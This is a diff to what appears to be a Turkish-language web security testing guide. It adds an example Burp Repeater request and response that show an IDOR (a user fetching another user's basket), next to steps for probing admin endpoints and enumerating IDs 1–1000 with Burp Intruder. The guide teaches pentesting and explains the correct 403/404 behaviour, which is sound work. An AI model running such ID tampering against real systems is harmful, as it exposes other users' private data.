@@ -86,7 +86,18 @@ flowchart TD
 3. Dikey test: normal kullanıcıyla admin endpoint'ini (`/api/admin/...`) doğrudan çağır. Yanıt `200` ise → dikey yetki atlama.
 4. Enumeration: Burp Intruder ile ID'yi `1..1000` gez, kaç tanesinin `200` döndüğünü gör.
 
-> 📸 EKRAN GÖRÜNTÜSÜ EKLENECEK: Burp Repeater'da ID'yi değiştirip başka kullanıcının verisinin döndüğü istek/yanıt.
+**Burp Repeater'da IDOR'un görünümü** — kendi ID'n yerine başkasınınkini isteyince veri yine döner:
+```http
+GET /api/basket/6 HTTP/1.1        ← kendi sepetin id=5 iken 6'yı istedin
+Host: hedef.local
+Cookie: session=SENIN_OTURUMUN
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"id":6,"user":"baska_kullanici","items":[{"urun":"Laptop","fiyat":25000}]}
+```
+`200 OK` + başka kullanıcının verisi = **IDOR doğrulandı**. Sunucu "giriş yapmış mısın?" (evet) diye sordu ama "bu sepet senin mi?" (hayır) diye sormadı. Doğru davranış `404`/`403` dönmek olurdu.
 
 ---
 
